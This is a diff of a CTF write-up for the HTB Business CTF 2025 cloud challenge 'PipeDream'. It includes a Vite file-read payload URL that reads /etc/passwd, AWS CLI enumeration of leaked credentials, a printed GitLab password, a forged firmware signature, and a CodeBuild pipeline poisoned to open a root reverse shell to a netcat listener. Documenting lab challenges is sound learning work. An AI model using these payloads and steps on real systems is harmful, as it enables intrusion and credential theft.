@@ -1,31 +1,22 @@
 # :game_die: Learning Cloud With Htb Business Ctf 2025 A Complete Cloud Writeup Part 2 End 42
 
-> **Original Source:** [Learning Cloud With Htb Business Ctf 2025 A Complete Cloud Writeup Part 2 End 42](https://infosecwriteups.com/learning-cloud-with-htb-business-ctf-2025-a-complete-cloud-writeup-part-2-end-4274d9ea2646)
-> **Platform:** infosecwriteups.com | **Category:** `MISC` | **Year:** 2025
-
 ---
 
 ## [975 points] PipeDream
-
 
 >
 
 TLDR:- AWS Key exposed in App’s Environment Variables- Credential leak from AWS DynamoDB tables- Abusing Gitlab codebuild runner to gain RCE
 
-
 ### Initial Look
-
 
 >
 
 This will be a pretty long journey, so grab your coffee and let’s get started.
 
-
 At first, we are greeted with a self-hosted gitlab site.
 
-
 We’ve tried some possible common credentials such as admin:admin, root:root, root:5iveL!fe, but nothing works. We left the gitlab and continue searching other possibilities. We tried to nmap and this is the result.
-
 
 ```
 └─$ nmap -sV -sC -p- 18.189.24.231 -oN nmapscanx
@@ -103,94 +94,67 @@ SF-Port5173-TCP:V=7.94SVN%I=7%D=5/25%Time=68333CCA%P=x86_64-pc-linux-gnu%r
 
 ```
 
-
 Turns out there are other ports opened other than 22 and 443. There seems another web application running on port 5173, so let’s inspect them.
-
 
 Another website that shows the water tank status. There’s also another page Firmware Update and Water Plant Settings. However, the feature doesn’t work as intended as nothing happened when you click the buttons. We can ignore these features.
 
-
 Upon looking on burpsuite HTTP history, we found that the application likely run on Vite framework.
-
 
 ### Exploit (?)
 
-
 While searching for references, we found that Vite has a recent public exploit for Arbitrary File Read vulnerability ([https://nsfocusglobal.com/vite-arbitrary-file-read-vulnerability-cve-2025-31486/](https://nsfocusglobal.com/vite-arbitrary-file-read-vulnerability-cve-2025-31486/)).
-
 
 ```
 http://18.189.24.231:5173/@fs/etc/passwd?import&raw??
 ```
 
-
 and we can just read the flag.txt
-
 
 ```
 http://18.189.24.231:5173/@fs/flag.txt?import&raw??
 ```
 
-
 Yay! We got the flag. However, challenge has yet to begin…
 
-
 As per challenge author’s words, getting the flag by abusing the Vite vulnerability CVE-2025–31486 is the unintended solution (I submitted the flag i got with unintended way tho, because a point still a point).
-
 
 So what’s the real solution? After the competition ends, I learned the intended way from author’s official [writeup](http://github.com/hackthebox/business-ctf-2025/tree/master/cloud/PipeDream). Here’s the intended solution:
 
 ### The Intended Way
 
-
 Environment Variables
-
 
 *src:[vite.dev](https://vite.dev)*
 
-
 By the words of Vite [official documentation](https://vite.dev/guide/env-and-mode), Vite environment variables can be found on these files: `.env`, `.env.local`, `.env.production`, etc. In this case, we can find the environment variables in `.env.production`.
-
 
 We get AWS creds! As usual, config the key we go.
 
-
 Configure and Enumerating the creds
-
 
 As usual, we used [enumerate-iam](https://github.com/andresriancho/enumerate-iam).
 
-
 dynamodb:list_tables() again? Luckily we already learn how to enumerate this privilege from the previous challenge.
-
 
 ```
 aws dynamodb list-tables --profile pipedream --region us-east-2
 ```
 
-
 Let’s inspect `ciusers` table.
-
 
 ```
 aws dynamodb scan --table-name ciusers --profile pipedream --region us-east-2
 ```
 
-
 Cool! We got several potential usernames and passwords. Perhaps we can use those to log in to the Gitlab?
-
 
 ## Get Crisdeo Nuel Siahaan’s stories in your inbox
 
-
 Join Medium for free to get updates from this writer.
-
 
 Remember me for faster sign in
 
-
 Back to Gitlab
-
 
 Trying the creds one by one, we found that credentials siberion is valid.
 
@@ -199,30 +163,21 @@ Trying the creds one by one, we found that credentials siberion is valid.
 Obtained valid creds:Username = siberion
 Password = Wuj!)e9Ex’]s}Xt
 
-
 Successfully logged in as siberion!
-
 
 There is only one project which is created by Administrator. Let’s inspect that.
 
-
 Turns out the application will redirect to internal hostname gitlab.local. To fix that, we can edit our hosts file by adding `gitlab.local` with cloud IP `18.189.24.231`:
-
 
 `C:\Windows\System32\Drivers\etc\hosts` for Windows
 
-
 `/etc/hosts` for Linux
-
 
 Once added, refresh the page and now we can visit the project page.
 
-
 Below is the content of several files:
 
-
 `Makefile`
-
 
 ```
 CC=gcc
@@ -243,9 +198,7 @@ clean:
 rm -f *.o firmware.elf
 ```
 
-
 `.gitlab-ci.yml`
-
 
 ```
 workflow:
@@ -291,9 +244,7 @@ rules:
 - if: $CI_PIPELINE_SOURCE == "merge_request_event"
 ```
 
-
 `main.c`
-
 
 ```
 #include "water_control.h"
@@ -330,9 +281,7 @@ return 0;
 }
 ```
 
-
 `firmware-meta.json`
-
 
 ```
 {
@@ -342,23 +291,17 @@ return 0;
 }
 ```
 
-
 There is also `buildspec.yml` file, so this challenge might be related to AWS Codebuild.
 
 ### Quick Idea
 
-
 AWS Codebuild
-
 
 AWS CodeBuild is a fully managed build service in the cloud. In short, you give CodeBuild your source code → it compiles, tests, packages, and produces build artifacts → done.
 
-
 buildspec.yml
 
-
 `buildspec.yml` is a configuration file used mainly with AWS CodeBuild. It tells CodeBuild how to build your project — basically, it's the build instructions. AWS looks at this file to figure out:
-
 
 - which commands to run,
 
@@ -368,9 +311,7 @@ buildspec.yml
 
 - etc.
 
-
 Now let’s inspect the buildspec.yml.
-
 
 ```
 version: 0.2
@@ -415,12 +356,9 @@ commands:
 - scp firmware.elf root@${GITLAB_HOST}:/root/firmware/firmware.elf
 ```
 
-
 Analyzing the buildspec, this is what happened:
 
-
 - Setup environment variables and secrets. This shows that the application run as root.
-
 
 ```
 env:
@@ -433,9 +371,7 @@ DEPLOY_KEY: "volnaya/deploy-key:GITLAB_SSH_KEY"
 DEBUG_KEY: "volnaya/debug-key:PUBLIC_KEY"
 ```
 
-
 2. Setup Git Credentials and Cloning the repository
-
 
 ```
 - git config --global credential.helper store
@@ -443,9 +379,7 @@ DEBUG_KEY: "volnaya/debug-key:PUBLIC_KEY"
 - git -c http.sslVerify=false clone https://${GITLAB_HOST}/root/volnaya-waterplant-firmware.git firmware
 ```
 
-
 3. Firmware signature verification. It verify the “signature” value in firmware_meta.json
-
 
 ```
 - cd firmware
@@ -457,9 +391,7 @@ DEBUG_KEY: "volnaya/debug-key:PUBLIC_KEY"
 - openssl dgst -sha256 -verify /tmp/public_key.pem -signature "$SIGNATURE_FILE" "$CLEAN_META"
 ```
 
-
 4. Firmware hash verification. It compares SHA256 hash of main.c with the “firmware_hash” value in firmware_meta.json
-
 
 ```
 - ACTUAL_HASH=$(sha256sum main.c | awk '{print $1}')
@@ -467,18 +399,14 @@ DEBUG_KEY: "volnaya/debug-key:PUBLIC_KEY"
 - "$ACTUAL_HASH" == "$EXPECTED_HASH" && echo "Source hash matches signed firmware." || { echo "Hash comparision failed. Exiting."; exit 1; }
 ```
 
-
 5. Build process
-
 
 ```
 - echo "Building Firmware"
 - make
 ```
 
-
 6. SSH setup and deployment
-
 
 ```
 - mkdir -p ~/.ssh
@@ -488,52 +416,37 @@ DEBUG_KEY: "volnaya/debug-key:PUBLIC_KEY"
 - scp firmware.elf root@${GITLAB_HOST}:/root/firmware/firmware.elf
 ```
 
-
 Since the application will be built and run, we can obtain RCE as root by modifying `main.c` into reverse shell code. However, there is a signature checking through file `firmware-meta.json `so we have to forge the signature of our modified code as well.
 
-
 To achieve that, we still need 2 components:
-
 
 - The privilege of building the project
 
 - The private key used to create project’s signature
 
-
 Uncovering the past
-
 
 Continuing the enumeration, we can find hardcoded AWS creds and a private key from the project’s commit history.
 
-
 *hardcoded AWS creds in commit fd21cc16ea6773c506fe7da5bd9d87e2c32399be*
-
 
 *hardcoded private key in commit aff5a0a10fbafc1bdbf510dacc47f7d499bbc998*
 
-
 Again, we configure and checked the privilege of the obtained AWS creds.
-
 
 *configuring the creds*
 
-
 *enumerating the key*
 
-
 There exist privilege codebuild:list_projects() which are used to list all CodeBuild build projects in your AWS account.
-
 
 ```
 aws codebuild list-projects --profile pipedream_root --region us-east-2
 ```
 
-
 From the output above, we know that there is a project called `volnaya-firmware-build` which is likely are related to the project we saw in gitlab.
 
-
 Now let’s check if this creds we are using right now have the privilege to start the build.
-
 
 ```
 
@@ -541,17 +454,13 @@ aws codebuild start-build --project-name volnaya-firmware-build \
 --profile pipedream_root --region us-east-2
 ```
 
-
 Nice… there’s no forbidden issue and the output shows the build, indicating that our account does have the privilege to start the build.
 
 ### Exploit
 
-
 Now we already have the privilege to run the build and forge the signature. Let’s modify the main.c so it spawn a reverse shell.
 
-
 `main.c` (NEW)
-
 
 ```
 └─$ cat main.c
@@ -592,76 +501,54 @@ return 0;
 }
 ```
 
-
 Then we forge the signature of the code, by doing this:
-
 
 - Get the SHA256sum of main.c
 
-
 2. Create a new `firmware_meta.json`, put the sha256 hash in the “firmware_hash”. Remove the “signature” part.
 
-
 3. Sign the new firmware_meta.json with the private key, take the base64 value of the new signature.
-
 
 ```
 openssl dgst -sha256 -sign getpriv.pem -out signature.sig firmware_meta.json
 base64 -w0 signature.sig
 ```
 
-
 4. Add the new signature to firmware_meta.json
-
 
 Now we have made modified `main.c` and `firmware_meta.json`, let’s add them to the repository. We can edit the repository through Web IDE.
 
-
 Replace the content of the `main.c` and `firmware_meta.json` with our modified one. After that, commit the change.
-
 
 Create merge request.
 
-
 After the merge request created, it immediately merged to the main repository due to administrator have enabled the automatic merge.
-
 
 We can check the main.c file in the repository again, it has modified.
 
-
 Now we know that the project has been updated with our malicious code, let’s run the build. But first, we have to prepare the reverse shell listener from our VPS.
-
 
 ```
 nc -nvlp 6004
 ```
 
-
 Run the finishing blow.
-
 
 ```
 aws codebuild start-build --project-name volnaya-firmware-build \
 --profile pipedream_root --region us-east-2
 ```
 
-
 Reverse shell as root will be popped up.
 
-
 Now that’s real flag for us!
-
 
 This challenge is really fun and creative challenge, as there are many aspects of cloud knowledge we could learn.
 
 ### Flag
-
 
 >
 
 HTB{Br34k1ng_th3_Bu1ld}
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/learning-cloud-with-htb-business-ctf-2025-a-complete-cloud-writeup-part-2-end-4274d9ea2646). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
